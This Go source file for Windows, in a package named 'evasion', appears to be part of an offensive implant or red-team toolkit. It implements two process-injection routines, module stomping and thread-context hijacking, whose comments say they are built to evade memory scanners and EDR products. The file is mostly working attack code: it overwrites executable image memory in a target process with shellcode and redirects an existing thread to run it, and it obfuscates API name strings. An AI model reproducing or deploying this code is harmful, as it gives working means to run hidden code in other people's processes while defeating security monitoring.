//go:build windows
// +build windows

package evasion

// Module-stomping injection + threadless thread-hijack injection.
//
// Classic injection leaves a MEM_PRIVATE RWX (or RX after flip) region visible
// to memory scanners — Moneta, pe-sieve, Kaspersky System Watcher all alarm on
// it.  Module stomping sidesteps this:
//
//   1. Walk the target's VA space for a MEM_IMAGE PAGE_EXECUTE_READ region.
//   2. Temporarily flip it RW, write shellcode, flip back to RX.
//   3. VirtualQuery on the shellcode address now reports:
//        Type    = MEM_IMAGE  (0x01000000)
//        Protect = PAGE_EXECUTE_READ
//        State   = MEM_COMMIT
//      — identical to legitimate DLL code.  No new allocation exists.
//
// Two execution variants:
//
//   StompInject       — stomps + NtCreateThreadEx inside the image region.
//   ThreadHijackInject — stomps + redirects an EXISTING thread's RIP via
//                        NtGetContextThread/NtSetContextThread.  Zero new
//                        threads created, zero NtQueueApcThread calls.

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	stompSkip   = 0x2000     // skip first 8 KB to avoid DLL entry-point / PE header
	memImageType = 0x01000000 // VirtualQuery Type: MEM_IMAGE
	ctxControl  = 0x00100001 // CONTEXT_AMD64 | CONTEXT_CONTROL
)

// amd64Ctx is a flat 1232-byte buffer that maps to the AMD64 CONTEXT structure.
// Fields are accessed via typed helpers using their documented byte offsets so
// we do not depend on a specific Go struct layout for a 1200+ byte type.
//
// Key offsets (from winnt.h / WDK):
//   0x030 ContextFlags uint32
//   0x098 Rsp          uint64
//   0x0F8 Rip          uint64
type amd64Ctx [1232]byte

func (c *amd64Ctx) flagsPtr() *uint32 { return (*uint32)(unsafe.Pointer(&c[0x30])) }
func (c *amd64Ctx) rspPtr() *uint64   { return (*uint64)(unsafe.Pointer(&c[0x98])) }
func (c *amd64Ctx) ripPtr() *uint64   { return (*uint64)(unsafe.Pointer(&c[0xF8])) }

// StompInject writes shellcode into an existing MEM_IMAGE region of the target
// process, then executes it with NtCreateThreadEx.
//
// NT operations visible in the target:
//   NtWriteVirtualMemory, NtProtectVirtualMemory×2, NtCreateThreadEx
// — no new allocation, no MEM_PRIVATE region, no Section object.
func StompInject(sc []byte, pid uint32) error {
	if len(sc) == 0 {
		return fmt.Errorf("empty shellcode")
	}
	proc, err := openProcForStomp(pid)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(proc)

	target, err := findStompTarget(uintptr(proc), uintptr(len(sc)))
	if err != nil {
		return err
	}

	if !NtProtectRemote(uintptr(proc), target, uintptr(len(sc)), windows.PAGE_READWRITE) {
		return fmt.Errorf("NtProtect→RW failed at %#x", target)
	}
	if !NtWriteRemote(uintptr(proc), target, sc) {
		NtProtectRemote(uintptr(proc), target, uintptr(len(sc)), windows.PAGE_EXECUTE_READ)
		return fmt.Errorf("NtWrite failed")
	}
	if !NtProtectRemote(uintptr(proc), target, uintptr(len(sc)), windows.PAGE_EXECUTE_READ) {
		return fmt.Errorf("NtProtect→RX failed")
	}

	th := NtCreateThreadEx(uintptr(proc), target)
	if th == 0 {
		return fmt.Errorf("NtCreateThreadEx failed")
	}
	windows.CloseHandle(windows.Handle(th))
	return nil
}

// ThreadHijackInject combines module stomping with thread context hijacking.
//
// Execution model:
//   1. Stomp shellcode into a MEM_IMAGE RX region.
//   2. Suspend an existing thread via NtSuspendThread.
//   3. Capture its context (NtGetContextThread, CONTEXT_CONTROL).
//   4. Push the original RIP onto the thread's stack so the shellcode can
//      `ret` back to the thread's original execution point.
//   5. Set context.Rip = stomped region, context.Rsp = new stack top.
//   6. Apply (NtSetContextThread) and resume.
//
// NT operations visible in the target:
//   NtWriteVirtualMemory×2, NtProtectVirtualMemory×2,
//   NtSuspendThread, NtGetContextThread, NtSetContextThread, NtResumeThread
// — NtCreateThreadEx is never called.
func ThreadHijackInject(sc []byte, pid uint32) error {
	if len(sc) == 0 {
		return fmt.Errorf("empty shellcode")
	}
	proc, err := openProcForStomp(pid)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(proc)

	const (
		threadSuspendResume = 0x0002
		threadGetCtx        = 0x0008
		threadSetCtx        = 0x0010
	)
	th := NtGetNextThread(uintptr(proc), 0,
		threadSuspendResume|threadGetCtx|threadSetCtx)
	if th == 0 {
		return fmt.Errorf("no accessible thread in pid %d", pid)
	}
	defer windows.CloseHandle(windows.Handle(th))

	target, err := findStompTarget(uintptr(proc), uintptr(len(sc)))
	if err != nil {
		return err
	}

	if !NtProtectRemote(uintptr(proc), target, uintptr(len(sc)), windows.PAGE_READWRITE) {
		return fmt.Errorf("NtProtect→RW failed")
	}
	written := NtWriteRemote(uintptr(proc), target, sc)
	NtProtectRemote(uintptr(proc), target, uintptr(len(sc)), windows.PAGE_EXECUTE_READ)
	if !written {
		return fmt.Errorf("NtWrite failed")
	}

	suspProc := getNtSuspendThreadProc()
	if suspProc == nil {
		return fmt.Errorf("NtSuspendThread unavailable")
	}
	if r, _, _ := suspProc.Call(th, 0); r != 0 {
		return fmt.Errorf("NtSuspendThread: %#x", r)
	}
	resumeOnErr := func() { getNtResumeThreadProc().Call(th, 0) }

	var ctx amd64Ctx
	*ctx.flagsPtr() = ctxControl
	getCtxProc := getNtGetContextThreadProc()
	if getCtxProc == nil {
		resumeOnErr()
		return fmt.Errorf("NtGetContextThread unavailable")
	}
	if r, _, _ := getCtxProc.Call(th, uintptr(unsafe.Pointer(&ctx))); r != 0 {
		resumeOnErr()
		return fmt.Errorf("NtGetContextThread: %#x", r)
	}

	// Push original RIP onto the target thread's stack.
	// When the shellcode executes `ret`, execution returns to the thread's
	// original instruction pointer — the thread never notices the hijack.
	origRip := *ctx.ripPtr()
	newRsp := *ctx.rspPtr() - 8
	var ripLE [8]byte
	for i := 0; i < 8; i++ {
		ripLE[i] = byte(origRip >> (uint(i) * 8))
	}
	if !NtWriteRemote(uintptr(proc), uintptr(newRsp), ripLE[:]) {
		resumeOnErr()
		return fmt.Errorf("stack write failed")
	}

	*ctx.rspPtr() = newRsp
	*ctx.ripPtr() = uint64(target)
	setCtxProc := getNtSetContextThreadProc()
	if setCtxProc == nil {
		resumeOnErr()
		return fmt.Errorf("NtSetContextThread unavailable")
	}
	if r, _, _ := setCtxProc.Call(th, uintptr(unsafe.Pointer(&ctx))); r != 0 {
		resumeOnErr()
		return fmt.Errorf("NtSetContextThread: %#x", r)
	}

	if p := getNtResumeThreadProc(); p != nil {
		p.Call(th, 0)
	}
	return nil
}

// openProcForStomp opens the target process with the access rights needed for
// stomping (VM write/operation) and thread context operations.
// If pid == 0 it returns the current process pseudo-handle.
func openProcForStomp(pid uint32) (windows.Handle, error) {
	if pid == 0 {
		return windows.GetCurrentProcess()
	}
	const access = windows.PROCESS_VM_WRITE | windows.PROCESS_VM_OPERATION |
		windows.PROCESS_QUERY_INFORMATION | windows.PROCESS_SUSPEND_RESUME
	return windows.OpenProcess(access, false, pid)
}

// findStompTarget walks the target process's VA space and returns the first
// address inside a MEM_IMAGE PAGE_EXECUTE_READ region large enough for size
// bytes, skipping stompSkip bytes at the start of each region.
func findStompTarget(proc uintptr, size uintptr) (uintptr, error) {
	virtQueryEx := modKernel32.NewProc(stackStr(
		'V', 'i', 'r', 't', 'u', 'a', 'l', 'Q', 'u', 'e', 'r', 'y', 'E', 'x',
	))
	var addr uintptr
	for {
		var mbi windows.MemoryBasicInformation
		r, _, _ := virtQueryEx.Call(
			proc, addr,
			uintptr(unsafe.Pointer(&mbi)),
			unsafe.Sizeof(mbi),
		)
		if r == 0 {
			break
		}
		if mbi.State == windows.MEM_COMMIT &&
			mbi.Type == memImageType &&
			mbi.Protect == windows.PAGE_EXECUTE_READ &&
			uintptr(mbi.RegionSize) >= stompSkip+size {
			return mbi.BaseAddress + stompSkip, nil
		}
		next := mbi.BaseAddress + uintptr(mbi.RegionSize)
		if next <= addr {
			break
		}
		addr = next
	}
	return 0, fmt.Errorf("no MEM_IMAGE RX region ≥ %d bytes in target", size)
}
